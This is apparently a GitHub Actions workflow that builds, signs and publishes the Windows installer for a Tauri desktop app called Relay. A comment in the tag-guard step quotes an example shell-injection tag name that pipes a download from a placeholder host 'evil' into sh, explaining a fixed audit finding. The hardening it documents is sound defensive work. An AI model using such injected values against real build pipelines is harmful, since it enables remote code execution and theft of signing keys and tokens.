# Build & release Relay for Windows (NSIS).
#
# Triggers on tag push (v*) or manual dispatch. The job:
# 1. Installs Tauri system deps.
# 2. Builds the relay-browser-mcp sidecar + stages it.
# 3. Builds the Tauri bundle (npm run tauri build), producing an unsigned
#    (Windows) installer.
# 4. Uploads the bundle as a workflow artifact.
#
# After the job completes, the `release` job downloads the artifact, signs the
# NSIS installer with the updater key, generates `latest.json`, and creates the
# GitHub Release — in the PUBLIC releases-only repo (Sabbir505/relay-releases),
# because the source repo is private and release assets must stay publicly
# downloadable. The landing page download links and the Tauri updater endpoint
# both point there.
#
# Required secrets (settings → Secrets and variables → Actions):
#   TAURI_SIGNING_PRIVATE_KEY          - contents of .tauri/relay-update.key
#                                        (the signer is invoked -p ""; the old
#                                        TAURI_SIGNING_PRIVATE_KEY_PASSWORD
#                                        secret is no longer read by this
#                                        workflow and can be retired)
#   RELEASES_TOKEN                     - fine-grained PAT with Contents: Read/write
#                                        on Sabbir505/relay-releases only (the
#                                        built-in GITHUB_TOKEN cannot publish to
#                                        another repository)
# Optional (SS5.2 Authenticode / SmartScreen trust — signing is skipped, with
# a loud notice, when either is unset):
#   AZURE_TENANT_ID / AZURE_CLIENT_ID / AZURE_CLIENT_SECRET
#                                      - service principal with the Trusted
#                                        Signing Certificate Profile Signer role
#   AZURE_TRUSTED_SIGNING_ACCOUNT      - Trusted Signing account name
#   AZURE_TRUSTED_SIGNING_PROFILE      - certificate profile name
#   AZURE_KEY_VAULT_URI                - the account's vault URI

name: Build & Release

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:

# contents: read is enough: publishing goes through the cross-repo
# RELEASES_TOKEN PAT (softprops action `token:` input), not GITHUB_TOKEN.
permissions:
  contents: read

jobs:
  # Windows-only by product decision (2026-09-19): the app ships as a Windows
  # NSIS bundle and the bundled Python/LibreOffice staging has no macOS target,
  # so a macOS compile check cannot be satisfied. The former check-macos job
  # (B-2) failed on every run for exactly that reason and was removed.
  # Cross-platform compile checking returns when macOS/Linux support lands.
  build-windows:
    name: Build (Windows)
    runs-on: windows-latest
    # A hung build must not burn the default 6h — with the signing flow
    # downstream this job is the expensive half of the release.
    timeout-minutes: 60
    steps:
      # Third-party actions are pinned to full commit SHAs (comment names the
      # release) — mutable tags in the workflow that holds the signing key
      # and PAT are a supply-chain hazard (audit 2026-10-03).
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          # Kept in step with ci.yml (see its note) — one toolchain across both
          # workflows, and 22 is what the Netlify site build already pins.
          node-version: "22"

      - name: Install Rust (stable)
        uses: dtolnay/rust-toolchain@89b12181fb390509a0842a86cc55eeb8eb928c1d # stable branch
        with:
          targets: x86_64-pc-windows-msvc

      - name: Cache cargo
        uses: actions/cache@0057852bfaa89a56745cba8c7296529d2fc39830 # v4.3.0
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
          key: ${{ runner.os }}-cargo-${{ hashFiles('src-tauri/Cargo.lock', 'src-tauri/Cargo.toml') }}
          restore-keys: |
            ${{ runner.os }}-cargo-

      - name: Install npm deps
        run: npm ci

      # Resources MUST be staged before any `cargo build` — even the sidecar
      # binary triggers the main build script (same Cargo package), which checks
      # the resource globs.
      - name: Stage bundled Python
        run: node scripts/fetch-bundled-python.mjs

      - name: Stage bundled LibreOffice
        run: node scripts/fetch-bundled-libreoffice.mjs

      - name: Verify staged resources
        run: |
          Write-Host "=== resources/python ==="
          if (Test-Path "src-tauri/resources/python/python.exe") {
            Write-Host "✓ python.exe found"
            Get-ChildItem "src-tauri/resources/python" -Directory | Select-Object -First 5 | ForEach-Object { Write-Host "  $($_.Name)" }
          } else {
            Write-Host "✗ python.exe NOT FOUND"
            Get-ChildItem "src-tauri/resources" -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "  $($_.Name)" }
          }
          Write-Host "=== resources/libreoffice ==="
          if (Test-Path "src-tauri/resources/libreoffice/program/soffice.exe") {
            Write-Host "✓ soffice.exe found"
          } else {
            Write-Host "✗ soffice.exe NOT FOUND"
          }

      # Sidecar build: resources exist now, so the build script won't fail.
      # BOTH sidecar placeholders must exist before the FIRST cargo build —
      # the sidecars share the main package, so its build script runs during
      # any cargo build and validates every externalBin path in tauri.conf.json.
      - name: Stage sidecar placeholders
        working-directory: src-tauri
        run: |
          New-Item -ItemType Directory -Force "binaries" | Out-Null
          New-Item -ItemType File -Force "binaries/relay-browser-mcp-x86_64-pc-windows-msvc.exe" | Out-Null
          New-Item -ItemType File -Force "binaries/relay-automation-x86_64-pc-windows-msvc.exe" | Out-Null

      - name: Build browser-mcp sidecar
        working-directory: src-tauri
        run: |
          cargo build --release --bin relay-browser-mcp
          node ../scripts/stage-sidecar.mjs relay-browser-mcp

      # Headless automation runner (the "Run while closed" Task Scheduler
      # target). Placeholder already staged above.
      - name: Build automation sidecar
        working-directory: src-tauri
        run: |
          cargo build --release --bin relay-automation
          node ../scripts/stage-sidecar.mjs relay-automation

      - name: Build (do NOT set signing env vars — the release job signs)
        env:
          NOTION_CLIENT_ID: ${{ secrets.NOTION_CLIENT_ID }}
          NOTION_CLIENT_SECRET: ${{ secrets.NOTION_CLIENT_SECRET }}
          GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          GOOGLE_CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          GITHUB_CLIENT_ID: ${{ secrets.GH_CLIENT_ID }}
          GITHUB_CLIENT_SECRET: ${{ secrets.GH_CLIENT_SECRET }}
        run: npm run tauri build

      - name: Upload Windows installer
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: windows-installer
          path: src-tauri/target/release/bundle/nsis/*.exe

  # Publishes ONLY on tag pushes. A manual workflow_dispatch runs on a branch
  # ref, where github.ref_name is a branch name (e.g. "main") — publishing that
  # would create a "main" release on the public repo and poison the update
  # feed. The guard step additionally fails unless the tag equals the version
  # in src-tauri/tauri.conf.json, so the feed can never be mislabeled.
  release:
    name: Publish GitHub Release
    runs-on: ubuntu-latest
    needs: [build-windows]
    # This job decrypts the updater signing key — a hung step must not leave
    # it materialized (and the runner billed) for the default 6h.
    timeout-minutes: 15
    if: startsWith(github.ref, 'refs/tags/v')
    # JOB-level, not step-level: `REF_NAME` is read by the Guard step AND by
    # the "Sign + generate latest.json" step (`--tag "$REF_NAME"`). Step-scoped
    # `env:` does not persist to sibling steps, so the sign step's
    # `set -euo pipefail` aborted EVERY tagged release with
    # `REF_NAME: unbound variable` — nothing signed, no latest.json, no
    # GitHub Release. Hoisting keeps the injection hardening: the value is
    # still passed through the environment, never interpolated into a shell
    # string (audit H38), and it stays out of the step bodies.
    env:
      REF_NAME: ${{ github.ref_name }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
        with:
          # Kept in step with ci.yml (see its note) — one toolchain across both
          # workflows, and 22 is what the Netlify site build already pins.
          node-version: "22"

      - name: Guard — tag must match the app version
        # REF_NAME flows through the job-level `env` (see the job header), not
        # direct interpolation: a tag name containing shell metacharacters
        # (`v1.0.0"; curl evil | sh; echo "`) used to execute inside this
        # script BEFORE the version guard could reject it — in the job that
        # holds the updater signing key and the releases PAT (audit H38;
        # hardening — pushing a tag already needs write access, but the fix is
        # one line).
        run: |
          set -euo pipefail
          tag="$REF_NAME"
          version="$(node -p "JSON.parse(require('fs').readFileSync('src-tauri/tauri.conf.json','utf8')).version")"
          if [ "$tag" != "v${version}" ]; then
            echo "::error::Tag '$tag' does not match the app version in src-tauri/tauri.conf.json (expected 'v${version}')."
            exit 1
          fi
          echo "Tag $tag matches v${version} from src-tauri/tauri.conf.json."

      - name: Download Windows installer
        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          name: windows-installer
          path: artifacts/windows

      - name: Restore signing key
        # The password is deliberately NOT written to disk (nothing reads it —
        # make-latest-json signs with `-p ""`).
        env:
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
        run: |
          set -euo pipefail
          mkdir -p .tauri
          printf '%s' "$TAURI_SIGNING_PRIVATE_KEY" > .tauri/relay-update.key
          chmod 600 .tauri/relay-update.key

      - name: Sign + generate latest.json
        # npm run release:latest-json expects the bundle at
        # src-tauri/target/release/bundle/nsis/, so we copy the downloaded
        # artifact into the layout the helper expects before running.
        # --tag pins the asset URLs to the real pushed tag instead of letting
        # the helper fall back to v<version>.
        run: |
          set -euo pipefail
          mkdir -p src-tauri/target/release/bundle/nsis
          cp -r artifacts/windows/* src-tauri/target/release/bundle/nsis/ 2>/dev/null || true
          npm run release:latest-json -- --notes-file CHANGELOG.md --tag "$REF_NAME"

      - name: Detect Trusted Signing secrets
        # SS5.2: Authenticode via Azure Trusted Signing. The detect step lets
        # the release stay green (with a notice) when the secrets are absent —
        # unsigned self-builds keep working unchanged. Inputs below follow the
        # official Azure/trusted-signing-action interface; bump the pin
        # deliberately after review.
        id: trusted_signing_detect
        env:
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
          AZURE_TRUSTED_SIGNING_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_PROFILE }}
        run: |
          if [ -n "$AZURE_TENANT_ID" ] && [ -n "$AZURE_CLIENT_ID" ] && [ -n "$AZURE_CLIENT_SECRET" ] && [ -n "$AZURE_TRUSTED_SIGNING_ACCOUNT" ] && [ -n "$AZURE_TRUSTED_SIGNING_PROFILE" ]; then
            echo "present=true" >> "$GITHUB_OUTPUT"
          else
            echo "present=false" >> "$GITHUB_OUTPUT"
            echo "::notice::Authenticode signing skipped — Trusted Signing secrets not configured (see packaging/winget/README.md)"
          fi

      - name: Authenticode-sign the installer (Azure Trusted Signing)
        if: steps.trusted_signing_detect.outputs.present == 'true'
        uses: Azure/trusted-signing-action@07c81171dd46a04e1b9f382b6c693815828bbbf7 # v0.5.0
        with:
          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
          azure-client-secret: ${{ secrets.AZURE_CLIENT_SECRET }}
          endpoint: ${{ secrets.AZURE_KEY_VAULT_URI }}
          trusted-signing-account-name: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
          certificate-profile-name: ${{ secrets.AZURE_TRUSTED_SIGNING_PROFILE }}
          files-folder: src-tauri/target/release/bundle/nsis
          files-folder-filter: exe
          file-digest: SHA256
          timestamp-rfc3161: http://timestamp.acs.microsoft.com

      - name: Extract release notes
        # Cross-repo releases can't use generate_release_notes (the tag has no
        # commit history in the releases repo), so the changelog text that the
        # updater banner shows doubles as the release body. Commit links in the
        # changelog point at the PRIVATE source repo and 404 for the public —
        # strip `[text](.../commit/...)` down to `text` first.
        run: |
          set -euo pipefail
          node -e 'const fs=require("fs");const j=JSON.parse(fs.readFileSync("src-tauri/target/release/bundle/latest.json","utf8"));const notes=(j.notes||"").replace(/\[([^\]]*)\]\([^)]*\/commit\/[^)]*\)/g,"$1");fs.writeFileSync("release-notes.md",notes)'

      - name: Publish GitHub Release (public releases repo)
        uses: softprops/action-gh-release@62c96d0c4e8a889135c1f3a25910db8dbe0e85f7 # v2.3.4
        with:
          repository: Sabbir505/relay-releases
          token: ${{ secrets.RELEASES_TOKEN }}
          tag_name: ${{ github.ref_name }}
          name: ${{ github.ref_name }}
          body_path: release-notes.md
          files: |
            src-tauri/target/release/bundle/nsis/*.exe
            src-tauri/target/release/bundle/latest.json
